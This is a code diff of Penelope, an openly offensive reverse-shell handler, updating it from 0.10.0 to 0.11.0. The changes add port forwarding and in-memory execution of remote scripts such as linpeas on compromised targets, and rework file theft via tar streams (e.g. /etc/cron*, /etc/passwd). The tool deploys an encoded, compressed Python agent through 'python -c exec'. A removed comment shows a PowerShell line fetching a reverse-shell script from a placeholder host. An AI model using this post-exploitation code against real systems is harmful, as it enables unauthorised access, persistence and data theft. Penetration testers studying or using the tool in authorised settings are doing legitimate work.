@@ -16,7 +16,7 @@
 # along with this program.  If not, see <https://www.gnu.org/licenses/>.
 
 __program__= "penelope"
-__version__ = "0.10.0"
+__version__ = "0.11.0"
 
 import os
 import io
@@ -52,19 +52,16 @@ import argparse
 import platform
 import threading
 import subprocess
+import socketserver
 import urllib.request
 
+from math import ceil
 from pathlib import Path
 from datetime import datetime
 from functools import wraps
 from itertools import islice
 from collections import deque, defaultdict
 from configparser import ConfigParser
-
-try:
-	import readline
-except ImportError:
-	readline = None
 
 if not sys.version_info >= (3, 6):
 	print("(!) Penelope requires Python version 3.6 or higher (!)")
@@ -76,7 +73,7 @@ class MainMenu(cmd.Cmd):
 		super().__init__()
 		self.set_id(None)
 		self.commands = {
-			"Session Operations":['run', 'upload', 'download', 'open', 'maintain', 'spawn', 'upgrade', 'exec', 'task', 'tasks'],
+			"Session Operations":['run', 'upload', 'download', 'open', 'maintain', 'spawn', 'upgrade', 'exec', 'script'],
 			"Session Management":['sessions', 'use', 'interact', 'kill', 'dir|.'],
 			"Shell Management"  :['listeners', 'connect', 'hints', 'Interfaces'],
 			"Miscellaneous"     :['help', 'history', 'reset', 'SET', 'DEBUG', 'exit|quit|q|Ctrl+D']
@@ -275,7 +272,6 @@ class MainMenu(cmd.Cmd):
 						source = 'Reverse shell from ' + str(session.listener) if session.listener else f'Bind shell (port {session.port})'
 						table += [ID, paint(session.type).CYAN if session.type == 'PTY' else session.type, source]
 					print("\n", textwrap.indent(str(table), "    "), "\n", sep="")
-				print(flush=True)
 			else:
 				print()
 				cmdlogger.warning("No sessions yet 😟")
@@ -323,7 +319,67 @@ class MainMenu(cmd.Cmd):
 				return True
 
 	@session(current=True)
-	def do_download(self, remote_path):
+	def do_portfwd(self, line):
+		"""
+		host:port (<-/->) host:port
+		Local and Remote port forwarding
+
+		Examples:
+
+			-> 192.168.0.1:80		Forward the localhost:80 to 192.168.0.1:80
+			0.0.0.0:8080 -> 192.168.0.1:80	Forward the 0.0.0.0:8080 to 192.168.0.1:80
+		"""
+		if not line:
+			logger.warning("No parameters...")
+			return False
+
+		match = re.search(r"((?:.*)?)(<-|->)((?:.*)?)", line)
+		if match:
+			group1 = match.group(1)
+			arrow = match.group(2)
+			group2 = match.group(3)
+		else:
+			logger.warning("Invalid syntax")
+			return False
+
+		if arrow == '->':
+			_type = 'L'
+			if group1:
+				match = re.search(r"((?:[^\s]*)?):((?:[^\s]*)?)", group1)
+				if match:
+					lhost = match.group(1)
+					lport = match.group(2)
+				else:
+					logger.warning("Invalid syntax")
+					return False
+			if group2:
+				match = re.search(r"((?:[^\s]*)?):((?:[^\s]*)?)", group2)
+				if match:
+					rhost = match.group(1)
+					rport = match.group(2)
+				if not rport:
+					logger.warning("At least remote port is required")
+					return False
+			else:
+				logger.warning("At least remote port is required")
+				return False
+
+		elif arrow == '<-':
+			_type = 'R'
+
+			if group2:
+				rhost, rport = group2.split(':')
+
+			if group1:
+				lhost, lport = group1.split(':')
+			else:
+				logger.warning("At least local port is required")
+				return False
+
+		core.sessions[self.sid].portfwd(_type=_type, lhost=lhost, lport=int(lport), rhost=rhost, rport=int(rport))
+
+	@session(current=True)
+	def do_download(self, remote_items):
 		"""
 		<glob>...
 		Download files / folders from the target
@@ -335,13 +391,13 @@ class MainMenu(cmd.Cmd):
 			download /etc/cron*		Download multiple remote files and directories using glob
 			download /etc/issue /var/spool	Download multiple remote files and directories at once
 		"""
-		if remote_path:
-			core.sessions[self.sid].download(remote_path)
+		if remote_items:
+			core.sessions[self.sid].download(remote_items)
 		else:
 			cmdlogger.warning("No files or directories specified")
 
 	@session(current=True)
-	def do_open(self, remote_path):
+	def do_open(self, remote_items):
 		"""
 		<glob>...
 		Download files / folders from the target and open them locally
@@ -353,10 +409,8 @@ class MainMenu(cmd.Cmd):
 			open /etc/cron*			Open locally multiple remote files and directories using glob
 			open /etc/issue /var/spool	Open locally multiple remote files and directories at once
 		"""
-		if remote_path:
-			items = []
-			for item_path in remote_path.split():
-				items.extend(core.sessions[self.sid].download(item_path))
+		if remote_items:
+			items = core.sessions[self.sid].download(remote_items)
 
 			if len(items) > options.max_open_files:
 				cmdlogger.warning(
@@ -372,7 +426,7 @@ class MainMenu(cmd.Cmd):
 			cmdlogger.warning("No files or directories specified")
 
 	@session(current=True)
-	def do_upload(self, local_globs):
+	def do_upload(self, local_items):
 		"""
 		<glob|URL>...
 		Upload files / folders / HTTP(S)/FTP(S) URLs to the target.
@@ -383,18 +437,28 @@ class MainMenu(cmd.Cmd):
 
 			upload /tools					  Upload a directory
 			upload /tools/mysuperdupertool.sh		  Upload a file
-			upload /tools/privesc*				  Upload multiple files and directories using glob
+			upload /tools/privesc* /tools2/*.sh		  Upload multiple files and directories using glob
 			upload https://github.com/x/y/z.sh		  Download the file locally and then push it to the target
-			upload https://www.exploit-db.com/exploits/40611  Download locally the underlying exploit code and upload it to the target
+			upload https://www.exploit-db.com/exploits/40611  Download the underlying exploit code locally and upload it to the target
 		"""
-		if local_globs:
-			try:
-				for glob in shlex.split(local_globs):
-					core.sessions[self.sid].upload(glob, randomize_fname=True)
-			except ValueError as e:
-				cmdlogger.error(e)
+		if local_items:
+			core.sessions[self.sid].upload(local_items, randomize_fname=True)
 		else:
 			cmdlogger.warning("No files or directories specified")
+
+	@session(current=True)
+	def do_script(self, local_item):
+		"""
+		<local_script|URL>
+		Execute a local script or URL from memory in the target and get the output in a local file
+
+		Examples:
+			script https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
+		"""
+		if local_item:
+			core.sessions[self.sid].script(local_item)
+		else:
+			cmdlogger.warning("No script to execute")
 
 	def show_modules(self):
 		table = Table(joinchar=' <-> ')
@@ -507,35 +571,11 @@ class MainMenu(cmd.Cmd):
 			exec cat /etc/passwd
 		"""
 		if cmdline:
-			output = core.sessions[self.sid].exec(cmdline, agent_typing=True, preserve_dir=True)
-			if output:
-				print(output.decode(), end='')
+			output = core.sessions[self.sid].exec(cmdline, preserve_dir=True, timeout=None, stdout_dst=sys.stdout.buffer, stderr_dst=sys.stderr.buffer)
 		else:
 			cmdlogger.warning("No command to execute")
 
-	@session(current=True)
-	def do_task(self, cmdline):
-		"""
-		<local_script|URL>
-		Execute a local script or URL from memory in the target and get the output in a local file
-
-		Examples:
-			task https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
-		"""
-		if cmdline:
-			task = core.sessions[self.sid].task(cmdline, localscript=True)
-			if not task:
-				return False
-			#print(paint("Output monitoring command:").blue)
-			files = [file.name for file in task['streams'].values()]
-			for file in set(files):
-				tail_cmd = f'tail -n+0 -f {file}'
-				Open(tail_cmd, terminal=True)
-				print(tail_cmd)
-		else:
-			cmdlogger.warning("No command to execute")
-
-	@session(current=True) # TODO
+	'''@session(current=True) # TODO
 	def do_tasks(self, line):
 		"""
 
@@ -566,7 +606,7 @@ class MainMenu(cmd.Cmd):
 		if len(table) > 1:
 			print(table)
 		else:
-			logger.warning("No assigned tasks")
+			logger.warning("No assigned tasks")'''
 
 	def do_listeners(self, line):
 		"""
@@ -700,6 +740,9 @@ class MainMenu(cmd.Cmd):
 				if thread.name == 'Core':
 					thread.join()
 			logger.info("Exited!")
+			remaining_threads = [thread for thread in threading.enumerate() if thread.name not in ('MainThread', 'Menu')]
+			if remaining_threads:
+				logger.error(f"Please report this: {remaining_threads}")
 			return True
 		return False
 
@@ -847,23 +890,28 @@ class ControlQueue:
 class Core:
 
 	def __init__(self):
+		self.started = False
+
 		self.control = ControlQueue()
 		self.rlist = [self.control]
 		self.wlist = []
+
 		self.attached_session = None
 		self.session_wait_host = None
 		self.session_wait = queue.LifoQueue()
-		self.started = False
-		self.sessionID = 0
+
+		self.lock = threading.Lock() # TO REMOVE
+
 		self.listenerID = 0
-		self.lock = threading.Lock()
+		self.listener_lock = threading.Lock()
+		self.sessionID = 0
+		self.session_lock = threading.Lock()
+
 		self.sessions = {}
 		self.listeners = {}
+		self.forwardings = {}
 
 	def __getattr__(self, name):
-#		if name in ('listeners', 'sessions'):
-#			_class = eval(name.capitalize()[:-1])
-#			return {item.id:item for item in self.rlist if type(item) is _class}
 
 		if name == 'hosts':
 			hosts = defaultdict(list)
@@ -872,14 +920,16 @@ class Core:
 			return hosts
 
 		elif name == 'new_listenerID':
-			with self.lock:
+			with self.listener_lock:
 				self.listenerID += 1
 				return self.listenerID
 
 		elif name == 'new_sessionID':
-			with self.lock:
+			with self.session_lock:
 				self.sessionID += 1
 				return self.sessionID
+		else:
+			raise AttributeError
 
 	@property
 	def threads(self):
@@ -947,14 +997,11 @@ class Core:
 						logger.error("You shouldn't see this error; Please report it")
 
 				# The sessions
-				else:
+				elif readable.__class__ is Session:
 					try:
 						data = readable.socket.recv(NET_BUF_SIZE)
 						if not data:
 							raise OSError
-
-						if hasattr(readable.control_session, 'progress_recv_queue'):
-							readable.control_session.progress_recv_queue.put(len(data))
 
 					except OSError:
 						logger.debug(f"Died while reading")
@@ -972,16 +1019,17 @@ class Core:
 							#print(_type,_value)
 							if _type == Messenger.SHELL:
 								target.write(_value)
-							elif _type == Messenger.TASK_RESPONSE:
-								taskid = _value[:8].decode()
-								stream = readable.tasks[taskid]['streams'][_value[8:9].decode()]
-								data = _value[9:]
-								if not data:
-									stream.close()
-								else:
-									stream.write(data)
-							else:
-								readable.responses.put(_value)
+
+							elif _type == Messenger.STREAM:
+								stream_id, data = _value[:Messenger.STREAM_BYTES], _value[Messenger.STREAM_BYTES:]
+								#print((repr(stream_id), repr(data)))
+								try:
+									readable.streams[stream_id] << data
+									if not data:
+										readable.streams[stream_id].terminate()
+								except (OSError, KeyError):
+									logger.debug(f"Cannot write to stream; Stream <{stream_id}> died prematurely")
+
 					else:
 						target.write(data)
 
@@ -1003,26 +1051,23 @@ class Core:
 						readable.shell_response_buf.seek(0)
 						readable.shell_response_buf.truncate(0)
 
-			else:
-				for writable in writables:
-					with writable.wlock:
-						try:
-							sent = writable.socket.send(writable.outbuf.getvalue())
-							if hasattr(writable.control_session, 'progress_send_queue'):
-								writable.control_session.progress_send_queue.put(sent)
-						except OSError:
-							logger.debug(f"Died while writing")
-							writable.kill()
-							threading.Thread(target=writable.maintain).start()
-							break
+			for writable in writables:
+				with writable.wlock:
+					try:
+						sent = writable.socket.send(writable.outbuf.getvalue())
+					except OSError:
+						logger.debug(f"Died while writing")
+						writable.kill()
+						threading.Thread(target=writable.maintain).start()
+						break
 
-						writable.outbuf.seek(sent)
-						remaining = writable.outbuf.read()
-						writable.outbuf.seek(0)
-						writable.outbuf.truncate()
-						writable.outbuf.write(remaining)
-						if not remaining:
-							self.wlist.remove(writable)
+					writable.outbuf.seek(sent)
+					remaining = writable.outbuf.read()
+					writable.outbuf.seek(0)
+					writable.outbuf.truncate()
+					writable.outbuf.write(remaining)
+					if not remaining:
+						self.wlist.remove(writable)
 
 	def stop(self):
 		options.maintain = 0
@@ -1187,6 +1232,8 @@ class Listener:
 
 		return f'\r\n'.join(output)
 
+class LocalTCPForwardListener(Listener):
+	pass
 
 class LineBuffer:
 
@@ -1256,7 +1303,6 @@ class Session:
 		self.version = None
 		self.user = None
 
-		self.dimensions = None
 		self.prompt = None
 		self.new = True
 		self.version = None
@@ -1276,17 +1322,25 @@ class Session:
 		self.need_resize = False
 		self.agent = False
 		self.messenger = Messenger(io.BytesIO)
-		self.responses = queue.Queue()
+
+		self.streamID = 0
+		self.streams = dict()
+		self.stream_lock = threading.Lock()
+		self.stream_code = Messenger.STREAM_CODE
+		self.streams_max = 2 ** (8 * Messenger.STREAM_BYTES)
 
 		self.shell_pid = None
 		self._bin = defaultdict(lambda: "")
 		self._tmp = None
 		self._cwd = None
+		self._bsd = None
 
 		self.id = core.new_sessionID
 		logger.debug(f"Assigned session ID: {self.id}")
 		core.rlist.append(self)
 		core.sessions[self.id] = self
+
+		self.script = self.run_in_background(self.script)
 
 		if self.determine():
 
@@ -1328,7 +1382,7 @@ class Session:
 				not self.listener and "Menu" in core.threads and menu.lastcmd.startswith('connect')
 			]
 
-			if hasattr(listener_menu, 'active'):
+			if hasattr(listener_menu, 'active') and listener_menu.active:
 				os.close(listener_menu.control_w)
 				listener_menu.finishing.wait()
 
@@ -1357,6 +1411,26 @@ class Session:
 			f"ID: {self.id} -> {__class__.__name__}({self.name}, {self.OS}, {self.type}, "
 			f"interactive={self.interactive}, echoing={self.echoing})"
 		)
+
+	def __getattr__(self, name):
+		if name == 'new_streamID':
+			with self.stream_lock:
+				if len(self.streams) == self.streams_max:
+					logger.error("Too many open streams...")
+					return None
+
+				self.streamID += 1
+				self.streamID = self.streamID % self.streams_max
+				while struct.pack(self.stream_code, self.streamID) in self.streams:
+					self.streamID += 1
+					self.streamID = self.streamID % self.streams_max
+
+				_stream_ID_hex = struct.pack(self.stream_code, self.streamID)
+				self.streams[_stream_ID_hex] = Stream(_stream_ID_hex, self)
+
+				return self.streams[_stream_ID_hex]
+		else:
+			raise AttributeError
 
 	def fileno(self):
 		return self.socket.fileno()
@@ -1388,24 +1462,48 @@ class Session:
 			return self
 
 	def get_shell_pid(self):
-		self.shell_pid = self.exec("echo $$", bypass=True, agent_typing=True, value=True)
-		if not (isinstance(self.shell_pid, str) and self.shell_pid.isnumeric()):
-			logger.error("Cannot get the PID of the shell. I am killing it...")
-			self.kill()
-			return False
+		if self.OS == 'Unix':
+			if self.agent:
+				self.shell_pid = self.exec("stdout_stream << str(shell_pid).encode()", python=True, value=True)
+			else:
+				self.shell_pid = self.exec("echo $$", bypass=True, value=True)
+				if not (isinstance(self.shell_pid, str) and self.shell_pid.isnumeric()):
+					logger.error("Cannot get the PID of the shell. Response: {self.shell_pid}")
+					logger.error("I am killing it...")
+					self.kill()
+					return False
+		elif self.OS == 'Windows':
+			self.shell_pid = None #TODO
+
+	@property
+	def bsd(self):
+		if self._bsd is None:
+			if self.OS == 'Unix':
+				response = self.control_session.exec("uname -s", value=True)
+				self._bsd = bool(re.search(r"(BSD|Darwin)", response))
+			elif self.OS == 'Windows':
+				self._bsd = False
+		return self._bsd
 
 	@property
 	def cwd(self):
-		if not self._cwd:
+		if self._cwd is None:
 			if self.OS == 'Unix':
 				if not self.shell_pid:
 					self.get_shell_pid()
-				cmd = f"readlink -f /proc/{self.shell_pid}/cwd"
-				if self.agent:
-					self.send(Messenger.message(Messenger.SHELL_EXEC, cmd.encode()))
-					self._cwd = self.responses.get().rstrip().decode()
+				if self.bsd:
+					self._cwd = self.control_session.exec(f"lsof -a -p {self.shell_pid} -d cwd -Fn 2>/dev/null | grep '^n' | cut -c2-", value=True)
+				elif self.agent:
+					self._cwd = self.exec(
+					f"""
+					try:
+						cwd = os.readlink('/proc/{self.shell_pid}/cwd')
+					except:
+						cwd = ''
+					stdout_stream << str(cwd).encode()
+					""", python=True, value=True)
 				else:
-					self._cwd = self.control_session.exec(cmd, value=True)
+					self._cwd = self.control_session.exec(f"readlink -f /proc/{self.shell_pid}/cwd", value=True)
 			elif self.OS == 'Windows':
 				self._cwd = self.control_session.exec("pwd", value=True)
 
@@ -1435,7 +1533,7 @@ class Session:
 				missing = [b for b in binaries if not self._bin[b].startswith("/")]
 
 				if missing:
-					logger.debug(paint(f"We didn't find the binaries: {missing}. Trying another method").red) 
+					logger.debug(paint(f"We didn't find the binaries: {missing}. Trying another method").red)
 					response = self.exec(
 						f'for bin in {" ".join(missing)}; do for dir in '
 						f'{" ".join(LINUX_PATH.split(":"))}; do _bin=$dir/$bin; ' # TODO PATH
@@ -1493,7 +1591,7 @@ class Session:
 				return False
 
 			self.outbuf.seek(0, io.SEEK_END)
-			self.outbuf.write(data)
+			_len = self.outbuf.write(data)
 
 			self.subchannel.allow_receive_shell_data = True
 
@@ -1501,6 +1599,7 @@ class Session:
 				core.wlist.append(self)
 				if not stdin:
 					core.control << ""
+			return _len
 
 	def record(self, data, _input=False):
 		self.last_lines << data
@@ -1615,6 +1714,14 @@ class Session:
 
 		return None
 
+	def run_in_background(self, func):
+		def wrapper(*args, **kwargs):
+			if self.agent:
+				threading.Thread(target=func, args=args, kwargs=kwargs).start()
+			else:
+				return func(*args, **kwargs)
+		return wrapper
+
 	def exec(
 		self,
 		cmd=None, 		# The command line to run
@@ -1624,21 +1731,134 @@ class Session:
 		expect=None,		# Items to wait for in the response
 		bypass=False,		# Control session usage
 		preserve_dir=False,	# Current dir preservation when using control session
-		separate=False,		# If true, send cmd via this method but receive with TLV method
-		agent_typing=False	# Simulate typing on shell (for agent)
+		separate=False,		# If true, send cmd via this method but receive with TLV method (agent)
+					# --- Agent only args ---
+		agent_typing=False,	# Simulate typing on shell
+		python=False,		# Execute python command
+		stdin_src=None,		# stdin stream source
+		stdout_dst=None,	# stdout stream destination
+		stderr_dst=None,	# stderr stream destination
+		stdin_stream=None,	# stdin_stream object
+		stdout_stream=None,	# stdout_stream object
+		stderr_stream=None	# stderr_stream object
 	):
+		if self.agent and not agent_typing: # TODO environment will not be the same as shell
+			if cmd:
+				if preserve_dir:
+					self.exec(f"os.chdir('{self.cwd}')", python=True)
+				cmd = textwrap.dedent(cmd)
+				if value: buffer = io.BytesIO()
+				timeout = options.short_timeout if value else None
+
+				if not stdin_stream:
+					stdin_stream = self.new_streamID
+					if not stdin_stream:
+						return
+				if not stdout_stream:
+					stdout_stream = self.new_streamID
+					if not stdout_stream:
+						return
+				if not stderr_stream:
+					stderr_stream = self.new_streamID
+					if not stderr_stream:
+						return
+
+				_type = 'S'.encode() if not python else 'P'.encode()
+				self.send(Messenger.message(Messenger.EXEC, _type + stdin_stream.id + stdout_stream.id + stderr_stream.id + cmd.encode()))
+				#print(stdin_stream.id, stdout_stream.id, stderr_stream.id)
+
+				rlist = []
+				if stdin_src:
+					rlist.append(stdin_src)
+				if stdout_dst or value:
+					rlist.append(stdout_stream)
+				if stderr_dst or value:
+					rlist.append(stderr_stream) # FIX
+				if not rlist:
+					return True
+
+				rlist.append(self.subchannel.control)
+				while True:
+					r, _, _ = select.select(rlist, [], [], timeout)
+
+					if not r:
+						stdin_stream.terminate()
+						stdout_stream.terminate()
+						stderr_stream.terminate()
+						return False
+
+					for readable in r:
+
+						if readable is self.subchannel.control:
+							command = self.subchannel.control.get()
+							if command == 'stop':
+								# TODO kill task here...
+								break
+
+						if readable is stdin_src:
+							if hasattr(stdin_src, 'read'): # FIX
+								data = stdin_src.read(NET_BUF_SIZE)
+							elif hasattr(stdin_src, 'recv'):
+								try:
+									data = stdin_src.recv(NET_BUF_SIZE)
+								except OSError:
+									pass # TEEEEMP
+							stdin_stream.write(data)
+							if not data:
+								stdin_stream << b""
+								rlist.remove(stdin_src)
+								if rlist == [self.subchannel.control]:
+									break
+
+						if readable is stdout_stream:
+							data = readable.read(NET_BUF_SIZE)
+							if value:
+								buffer.write(data)
+							elif stdout_dst:
+								if hasattr(stdout_dst, 'write'): # FIX
+									stdout_dst.write(data)
+									stdout_dst.flush()
+								elif hasattr(stdout_dst, 'sendall'):
+									try:
+										stdout_dst.sendall(data) # maybe broken pipe
+										if not data:
+											if stdout_dst in rlist:
+												rlist.remove(stdout_dst)
+									except:
+										if stdout_dst in rlist:
+											rlist.remove(stdout_dst)
+							if not data:
+								rlist.remove(readable)
+								if rlist == [self.subchannel.control]:
+									break
+
+						if readable is stderr_stream:
+							data = readable.read(NET_BUF_SIZE)
+							if value:
+								buffer.write(data)
+							elif stderr_dst:
+								if hasattr(stderr_dst, 'write'): # FIX
+									stderr_dst.write(data)
+								elif hasattr(stderr_dst, 'sendall'):
+									stderr_dst.sendall(data)
+							if not data:
+								rlist.remove(readable)
+								if rlist == [self.subchannel.control]:
+									break
+
+					else:
+						continue
+					break
+
+				if not stdin_src:
+					#stdin_stream.write(b"")
+					stdin_stream << b""
+					stdin_stream.terminate() # TODO
+
+				return buffer.getvalue().rstrip().decode() if value else True
+			return None
 
 		with self.lock:
-
-			if self.agent and not agent_typing: # TODO environment will not be the same as shell
-				if cmd:
-					self.send(Messenger.message(Messenger.SHELL_EXEC, cmd.encode()))
-					try:
-						return self.responses.get(timeout=15)#options.short_timeout)
-					except queue.Empty: # TODO temp fix: this is dangerous as next responses may come out of order
-						return b""
-				return None
-
 			if self.need_control_session and not bypass:
 				if preserve_dir:
 					self.control_session.exec(f"cd {self.cwd}")
@@ -1704,8 +1924,8 @@ class Session:
 
 			data_timeout = options.short_timeout if timeout is False else timeout
 			continuation_timeout = options.latency
-
 			timeout = data_timeout
+
 			last_data = time.perf_counter()
 			need_check = False
 			while self.subchannel.result is None:
@@ -1862,22 +2082,19 @@ class Session:
 				if self.bin['python3']:
 					_bin = self.bin['python3']
 					_decode = 'b64decode'
-					_exec = 'exec(_value, globals(), _locals)'
+					_exec = 'exec(cmd, globals(), locals())'
 
 				elif self.bin['python']:
 					_bin = self.bin['python']
 					_decode = 'decodestring'
-					_exec = 'exec _value in globals(), _locals'
+					_exec = 'exec cmd in globals(), locals()'
 
 				deploy_agent = True
-				payload = base64.b64encode( zlib.compress(
-					AGENT.format(
-					self.shell,
-					textwrap.indent(MESSENGER, "\t", lambda line: not line.startswith("class")),
-					_exec,
-					).encode())).decode()
+
+				agent = textwrap.dedent('\n'.join(AGENT.splitlines()[1:])).format(self.shell, NET_BUF_SIZE, MESSENGER, STREAM, _exec)
+				payload = base64.b64encode(zlib.compress(agent.encode(), 9)).decode()
 				cmd = (
-					f'{_bin} -c \'import base64,zlib;exec(zlib.decompress(base64.{_decode}("{payload}")));agent()\''
+					f'{_bin} -c \'import base64,zlib;exec(zlib.decompress(base64.{_decode}("{payload}")))\''
 				)
 
 			elif self.bin['script']:
@@ -1956,49 +2173,22 @@ class Session:
 
 		elif self.OS == "Windows":
 			logger.warning("Upgrading Windows shell is not implemented yet.")
-			#self.exec(f"powershell iex (New-Object Net.WebClient).DownloadString('http://X.X.X.X/Invoke-ConPtyShell.ps1'); Invoke-ConPtyShell {self._host} {self._port}", raw=False)
-			#self.detach()
-			#core.sessions[self.id + 1].attach()
 
 		return True
 
 	def update_pty_size(self):
-
 		columns, lines = shutil.get_terminal_size()
 
 		if self.agent:
 			self.send(Messenger.message(Messenger.RESIZE, struct.pack("HH", lines, columns)))
 
 		elif self.OS == 'Unix':
-			#if self.alternate_buffer:
-			#	logger.error(
-			#		"(!) Need PTY resize. Please exit the current alternate buffer program"
-			#	)
-			#	self.need_resize = True
-			#elif self.is_attached:
-			#	logger.error(
-			#		"(!) Please detach and attach again to resize the terminal"
-			#	)
-			#	self.need_resize = True
-			#else:
-			#	cmd = f"stty rows {self.dimensions.lines} columns {self.dimensions.columns}"
-			#	self.exec(cmd, raw=False)
-			#	self.need_resize = False
-			self.exec(f"stty rows {lines} columns {columns} -F {self.tty}")
-
-		elif self.OS == 'Windows':
-			cmd = (
-				f"$width={self.dimensions.columns};$height={self.dimensions.lines};"
-				f"$Host.UI.RawUI.BufferSize = New-Object Management.Automation.Host.Size "
-				f"($width, $height);$Host.UI.RawUI.WindowSize = New-Object -TypeName "
-				f"System.Management.Automation.Host.Size -ArgumentList ($width, $height)\r"
-			)
-			self.exec(cmd, raw=True) #TEMP
-			#self.need_resize = False
-
-		return True
+			threading.Thread(target=self.exec, args=(f"stty rows {lines} columns {columns} -F {self.tty}",), name="RESIZE").start() #TEMP
+			# TODO it needs a separate thread because there are sync issues
+			#self.exec(f"stty rows {lines} columns {columns} -F {self.tty}")
 
 	def attach(self):
+
 		if threading.current_thread().name != 'Core':
 			if self.new:
 				self.new = False
@@ -2015,14 +2205,14 @@ class Session:
 		if core.attached_session is not None:
 			return False
 
-		core.attached_session = self
-		core.rlist.append(sys.stdin)
-
 		logger.info(
 			f"Interacting with session {paint('[' + str(self.id) + ']').red}"
 			f"{paint(', Shell Type:').green} {paint(self.type).CYAN}{paint(', Menu key:').green} "
 			f"{paint(options.escape['key'] if self.type == 'PTY' else 'Ctrl-C').MAGENTA} "
 		)
+
+		core.attached_session = self
+		core.rlist.append(sys.stdin)
 
 		if not options.no_log:
 			logger.info(f"Logging to {paint(self.logpath).yellow_DIM} 📜")
@@ -2063,9 +2253,10 @@ class Session:
 
 		return True
 
-	def download(self, remote_item_path):
+	def download(self, remote_items):
+		# Initialization
 		try:
-			remote_globs = [glob for glob in shlex.split(remote_item_path)]
+			shlex.split(remote_items) # Early check for shlex errors
 		except ValueError as e:
 			logger.error(e)
 			return []
@@ -2077,133 +2268,155 @@ class Session:
 			logger.error(e)
 			return []
 
+		# Check for local available space
 		available_bytes = shutil.disk_usage(local_download_folder).free
+		if self.agent:
+			block_size = os.statvfs(local_download_folder).f_frsize
+			remote_size = int(float(self.exec(f"{inspect.getsource(get_glob_size)}"
+				f"stdout_stream << str(get_glob_size(r'{remote_items}', {block_size})).encode()", python=True, value=True, preserve_dir=True)))
+		else:
+			cmd = f"du -bcs {remote_items}"
+			response = self.exec(cmd, timeout=None, preserve_dir=True).decode()
+			#errors = [line[4:] for line in response.splitlines() if line.startswith('du: ')]
+			#for error in errors:
+			#	logger.error(error)
+			remote_size = int(response.splitlines()[-1].split()[0])
+
+		need = remote_size - available_bytes
+
+		if need > 0:
+			logger.error(
+				f"--- Not enough space to download... {paint('We need ').blue}"
+				f"{paint().yellow}{need:,}{paint().blue} more bytes..."
+			)
+			return []
 
 		if self.OS == 'Unix':
-			progress_bar = PBar(0, f"{paint('[+] ').green}{paint('--- ⇣ Downloading').blue}", 35)
+			# Packing and downloading
+			if self.agent:
+				stdout_stream = self.new_streamID
+				stderr_stream = self.new_streamID
 
-			try:
-				logger.info(paint('--- Remote packing...').blue)
-				if self.agent:
-					self.send(Messenger.message(Messenger.PYTHON_EXEC, f"os.chdir('{self.cwd}')".encode()))
-					self.control_session.progress_recv_queue = queue.Queue()
-					self.send(Messenger.message(Messenger.DOWNLOAD, remote_item_path.encode()))
-					response = self.responses.get()
-					while response  == b'-2':
-						logger.error(self.responses.get().decode())
-						response = self.responses.get()
+				if not all([stdout_stream, stderr_stream]):
+					return
 
-					send_size = int(response)
-					if send_size < 0:
-						logger.error(self.responses.get().decode())
+				code = fr"""
+				import glob
+				items = []
+				for part in shlex.split(r"{remote_items}"):
+					_items = glob.glob(os.path.expanduser(part))
+					if _items:
+						items.extend(_items)
+					else:
+						items.append(part)
+				import tarfile
+				tar = tarfile.open(name="", mode='w|gz', fileobj=stdout_stream)
+				tar.add = handle_exceptions(tar.add, stderr_stream.id)
+				for item in items:
+					tar.add(os.path.abspath(item))
+				tar.close()
+				"""
+
+				threading.Thread(target=self.exec, args=(code, ), kwargs={
+					'python': True,
+					'stdout_stream': stdout_stream,
+					'stderr_stream': stderr_stream,
+					'preserve_dir': True
+				}).start()
+
+				error_buffer = ''
+				while True:
+					r, _, _ = select.select([stderr_stream], [], [])
+					data = stderr_stream.read(NET_BUF_SIZE)
+					if data:
+						error_buffer += data.decode()
+						while '\n' in error_buffer:
+							line, error_buffer = error_buffer.split('\n', 1)
+							logger.error(line)
+					else:
+						break
+
+				tar_source, mode = stdout_stream, "r|gz"
+			else:
+				temp = self.tmp + "/" + rand(8)
+				cmd = f'tar cz $(for file in {remote_items};do readlink -f "$file";done) | base64 -w0 > {temp}'
+				response = self.exec(cmd, timeout=None, preserve_dir=True).decode()
+				errors = [line[5:] for line in response.splitlines() if line.startswith('tar: /')]
+				for error in errors:
+					logger.error(error)
+				send_size = int(self.exec(f"stat --printf='%s' {temp}"))
+
+				b64data = io.BytesIO()
+				for offset in range(0, send_size, options.download_chunk_size):
+					response = self.exec(f"cut -c{offset + 1}-{offset + options.download_chunk_size} {temp}")
+					if response is False:
+						logger.error("Download interrupted")
 						return []
+					b64data.write(response)
+				self.exec(f"rm {temp}")
 
-					actual_size = int(self.responses.get())
-					if not actual_size:
-						self.responses.get() # just consume
-						return []
+				data = io.BytesIO()
+				data.write(base64.b64decode(b64data.getvalue()))
+				data.seek(0)
+
+				tar_source, mode = data, "r:gz"
+
+			#print(remote_size)
+			#if not remote_size:
+			#	return []
+
+			# Local extraction
+			tar = tarfile.open(mode=mode, fileobj=tar_source)
+			tar.extract = handle_exceptions(tar.extract)
+
+			for item in tar:
+				tar.extract(item, local_download_folder)
+			tar.close()
+
+			# Get the remote absolute paths
+			if self.agent:
+				response = self.exec(f"""
+				import glob
+				remote_paths = ''
+				for part in shlex.split(r"{remote_items}"):
+					result = glob.glob(os.path.expanduser(part))
+					if result:
+						for item in result:
+							if os.path.exists(item):
+								remote_paths += os.path.abspath(item) + "\\n"
+					else:
+						remote_paths += part + "\\n"
+				stdout_stream << remote_paths.encode()
+				""", python=True, value=True, preserve_dir=True)
+			else:
+				cmd = f'for file in {remote_items}; do if [ -e "$file" ]; then readlink -f "$file"; else echo $file; fi; done'
+				response = self.exec(cmd, timeout=None, preserve_dir=True).decode()
+
+			remote_paths = response.splitlines()
+
+			# Present the downloads
+			downloaded = []
+			for path in remote_paths:
+				local_path = local_download_folder / path[1:]
+				if os.path.exists(local_path):
+					downloaded.append(local_path)
 				else:
-					cmd = f"du -bac {remote_item_path} 2>&1|tail -1|cut -f1"
-					actual_size = int(self.exec(cmd, timeout=None, preserve_dir=True))
-					if not actual_size:
-						logger.warning(f"No such file or directory: {shlex.quote(remote_item_path)}")
-						return []
+					logger.error(f"{paint('Download Failed').RED_white} => {local_path}")
 
-					temp = self.tmp + "/" + rand(8)
-					cmd = f"tar cz {remote_item_path} | base64 -w0 > {temp}"
-					response = self.exec(cmd, timeout=None, preserve_dir=True).decode()
-					errors = [line[5:] for line in response.splitlines() if line.startswith('tar: /')]
-					for error in errors:
-						logger.error(error)
-					send_size = int(self.exec(f"stat --printf='%s' {temp}"))
+			for item in downloaded:
+				logger.info(f"{paint('Downloaded').GREEN_white} => {paint(shlex.quote(pathlink(item))).yellow}") # PROBLEM with ../ TODO
 
-				logger.info(
